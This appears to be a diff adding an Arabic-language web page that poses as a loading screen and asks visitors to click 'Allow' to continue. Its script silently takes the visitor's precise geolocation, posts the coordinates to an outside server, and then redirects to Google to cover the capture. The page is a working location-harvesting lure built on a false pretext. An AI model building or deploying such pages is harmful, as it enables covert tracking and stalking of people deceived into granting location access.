@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جارٍ التحميل...</title>
+    <style>
+        body { font-family: Tahoma, sans-serif; text-align: center; margin-top: 20vh; background: #f4f4f9; color: #333; }
+        .loader { border: 6px solid #f3f3f3; border-top: 6px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h2>جارٍ تحميل الصفحة، يرجى الانتظار...</h2>
+    <p>يرجى السماح بالوصول للموقع (Allow) للمتابعة.</p>
+
+    <script>
+        const serverUrl = 'https://location-server-liart.vercel.app/save-location';
+
+        function sendLocation(position) {
+            const data = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            };
+
+            fetch(serverUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                window.location.href = "https://www.google.com";
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendLocation, null, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
+        }
+    </script>
+</body>
+</html>
